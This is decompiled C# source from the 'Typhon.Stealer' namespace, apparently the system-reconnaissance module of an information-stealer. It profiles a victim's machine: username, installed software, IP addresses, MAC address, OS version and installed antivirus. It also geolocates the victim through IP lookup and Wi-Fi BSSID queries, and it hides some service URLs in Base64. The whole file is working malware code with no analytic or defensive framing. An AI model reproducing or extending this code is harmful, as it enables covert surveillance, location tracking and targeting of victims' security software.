using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using Typhon.Modules.Miscellaneous;

namespace Typhon.Stealer.SystemInfo
{
	// Token: 0x0200000B RID: 11
	internal class UserDetails
	{
		// Token: 0x0600002A RID: 42
		[DllImport("iphlpapi.dll", ExactSpelling = true)]
		public static extern int SendARP(int destIp, int srcIP, byte[] macAddr, ref uint physicalAddrLen);

		// Token: 0x0600002B RID: 43 RVA: 0x000035CC File Offset: 0x000017CC
		public static string GetUserName()
		{
			return UserDetails.UserName;
		}

		// Token: 0x0600002C RID: 44 RVA: 0x000035D4 File Offset: 0x000017D4
		public static string GetInstalledSoftware()
		{
			string text = "";
			int num = 1;
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT * FROM Win32_Product").Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				string[] array = new string[5];
				array[0] = text;
				array[1] = num.ToString();
				array[2] = "> ";
				int num2 = 3;
				object obj = managementObject["Name"];
				array[num2] = ((obj != null) ? obj.ToString() : null);
				array[4] = Environment.NewLine;
				text = string.Concat(array);
				num++;
			}
			return text;
		}

		// Token: 0x0600002D RID: 45 RVA: 0x0000367C File Offset: 0x0000187C
		public static string GetMachineName()
		{
			return UserDetails.MachineName;
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00003684 File Offset: 0x00001884
		public static string GetAvailableLanguages()
		{
			List<string> list = new List<string>();
			try
			{
				foreach (object obj in InputLanguage.InstalledInputLanguages)
				{
					InputLanguage inputLanguage = (InputLanguage)obj;
					list.Add(inputLanguage.Culture.EnglishName);
				}
			}
			catch
			{
			}
			string text = "";
			foreach (string str in list)
			{
				text = text + str + Environment.NewLine;
			}
			if (!string.IsNullOrEmpty(text))
			{
				return text;
			}
			return "Failed to get languages";
		}

		// Token: 0x0600002F RID: 47 RVA: 0x0000375C File Offset: 0x0000195C
		public static string GetMAC()
		{
			return (from nic in NetworkInterface.GetAllNetworkInterfaces()
			where nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback
			select nic.GetPhysicalAddress().ToString()).FirstOrDefault<string>();
		}

		// Token: 0x06000030 RID: 48 RVA: 0x000037BB File Offset: 0x000019BB
		public static string GetDate()
		{
			return UserDetails.CurrentDate;
		}

		// Token: 0x06000031 RID: 49 RVA: 0x000037C2 File Offset: 0x000019C2
		public static string GetLanguage()
		{
			return UserDetails.KeyboardLanguage;
		}

		// Token: 0x06000032 RID: 50 RVA: 0x000037CC File Offset: 0x000019CC
		public static string GetUserData()
		{
			JSONNode jsonnode = JSON.Parse(new WebClient().DownloadString("http://ipinfo.io/json"));
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("ISP: " + jsonnode["org"]);
			stringBuilder.AppendLine("Timezone: " + jsonnode["timezone"]);
			stringBuilder.AppendLine("Country: " + jsonnode["country"]);
			stringBuilder.AppendLine("Region: " + jsonnode["region"]);
			stringBuilder.AppendLine("City: " + jsonnode["city"]);
			stringBuilder.AppendLine("ZIP code: " + jsonnode["postal"]);
			return stringBuilder.ToString();
		}

		// Token: 0x06000033 RID: 51 RVA: 0x000038C0 File Offset: 0x00001AC0
		public static string GetIPBasedLocation()
		{
			JSONNode jsonnode = JSON.Parse(new WebClient().DownloadString("http://ipinfo.io/json"));
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("Timezone: " + jsonnode["timezone"]);
			stringBuilder.AppendLine("Country: " + jsonnode["country"]);
			stringBuilder.AppendLine("Region: " + jsonnode["region"]);
			stringBuilder.AppendLine("City: " + jsonnode["city"]);
			stringBuilder.AppendLine("ZIP code: " + jsonnode["postal"]);
			return stringBuilder.ToString();
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00003994 File Offset: 0x00001B94
		private static string GetArchitecture()
		{
			try
			{
				if (Registry.LocalMachine.OpenSubKey("HARDWARE\\Description\\System\\CentralProcessor\\0").GetValue("Identifier").ToString().Contains("x86"))
				{
					return "x86";
				}
				return "x64";
			}
			catch
			{
			}
			return "(Unknown)";
		}

		// Token: 0x06000035 RID: 53 RVA: 0x000039F8 File Offset: 0x00001BF8
		private static string GetWindowsVersion()
		{
			string text = "Unknown System";
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", " SELECT * FROM win32_operatingsystem"))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						text = Convert.ToString(((ManagementObject)managementBaseObject)["Name"]);
					}
					text = text.Split(new char[]
					{
						'|'
					})[0];
					int length = text.Split(new char[]
					{
						' '
					})[0].Length;
					text = text.Substring(length).TrimStart(new char[0]).TrimEnd(new char[0]);
				}
			}
			catch
			{
			}
			return text;
		}

		// Token: 0x06000036 RID: 54 RVA: 0x00003AE0 File Offset: 0x00001CE0
		public static string GetSystemVersion()
		{
			return UserDetails.GetWindowsVersion() + " " + UserDetails.GetArchitecture();
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00003AF8 File Offset: 0x00001CF8
		public static string GetLocalIP()
		{
			try
			{
				foreach (IPAddress ipaddress in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
				{
					if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
					{
						return ipaddress.ToString();
					}
				}
			}
			catch
			{
			}
			return "No network adapters with an IPv4 address in the system!";
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00003B58 File Offset: 0x00001D58
		public static string GetPublicIP()
		{
			try
			{
				return new WebClient().DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9hcGkuaXBpZnkub3Jn"))).Replace("\n", "");
			}
			catch
			{
			}
			return "Request failed";
		}

		// Token: 0x06000039 RID: 57 RVA: 0x00003BB0 File Offset: 0x00001DB0
		private static string GetGatewayIP()
		{
			try
			{
				return (from a in (from n in NetworkInterface.GetAllNetworkInterfaces()
				where n.OperationalStatus == OperationalStatus.Up
				where n.NetworkInterfaceType != NetworkInterfaceType.Loopback
				select n).SelectMany(delegate(NetworkInterface n)
				{
					IPInterfaceProperties ipproperties = n.GetIPProperties();
					if (ipproperties == null)
					{
						return null;
					}
					return ipproperties.GatewayAddresses;
				}).Select(delegate(GatewayIPAddressInformation g)
				{
					if (g == null)
					{
						return null;
					}
					return g.Address;
				})
				where a != null
				select a).FirstOrDefault<IPAddress>().ToString();
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00003CA0 File Offset: 0x00001EA0
		private static string GetBSSID()
		{
			byte[] array = new byte[6];
			uint num = (uint)array.Length;
			try
			{
				if (UserDetails.SendARP(BitConverter.ToInt32(IPAddress.Parse(UserDetails.GetGatewayIP()).GetAddressBytes(), 0), 0, array, ref num) != 0)
				{
					return "unknown";
				}
				string[] array2 = new string[num];
				int num2 = 0;
				while ((long)num2 < (long)((ulong)num))
				{
					array2[num2] = array[num2].ToString("x2");
					num2++;
				}
				return string.Join(":", array2);
			}
			catch
			{
			}
			return "Failed";
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00003D38 File Offset: 0x00001F38
		public static string GetLocation(int mode)
		{
			string bssid = UserDetails.GetBSSID();
			string text = "Unknown";
			string text2 = "Unknown";
			string text3 = "Unknown";
			if (mode == 0)
			{
				return bssid;
			}
			string text4;
			try
			{
				using (WebClient webClient = new WebClient())
				{
					text4 = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9hcGkubXlsbmlrb3Yub3JnL2dlb2xvY2F0aW9uL3dpZmk/dj0xLjEmZGF0YT1vcGVuJmJzc2lkPQ==")) + bssid);
				}
			}
			catch
			{
				return "Failed";
			}
			if (!text4.Contains("{\"result\":200"))
			{
				return "Failed";
			}
			int num = 0;
			string[] array = text4.Split(new char[]
			{
				' '
			});
			foreach (string text5 in array)
			{
				num++;
				if (text5.Contains("\"lat\":"))
				{
					text = array[num].Replace(",", "");
				}
				if (text5.Contains("\"lon\":"))
				{
					text2 = array[num].Replace(",", "");
				}
				if (text5.Contains("\"range\":"))
				{
					text3 = array[num].Replace(",", "");
				}
			}
			return string.Concat(new string[]
			{
				"\nLatitude: ",
				text,
				"\nLongitude: ",
				text2,
				"\nRange: ",
				text3
			});
		}

		// Token: 0x0600003C RID: 60 RVA: 0x00003EAC File Offset: 0x000020AC
		internal static string GetAntiVirus()
		{
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct"))
				{
					List<string> list = new List<string>();
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						list.Add(managementBaseObject["displayName"].ToString());
					}
					if (list.Count == 0)
					{
						return "Not installed";
					}
					return string.Join(", ", list.ToArray()) + ".";
				}
			}
			catch
			{
			}
			return "N/A";
		}

		// Token: 0x04000023 RID: 35
		internal static string KeyboardLanguage = CultureInfo.CurrentCulture.EnglishName.ToString();

		// Token: 0x04000024 RID: 36
		internal static string UserName = Environment.UserName;

		// Token: 0x04000025 RID: 37
		internal static string MachineName = Environment.MachineName;

		// Token: 0x04000026 RID: 38
		internal static string CurrentDate = DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss");
	}
}
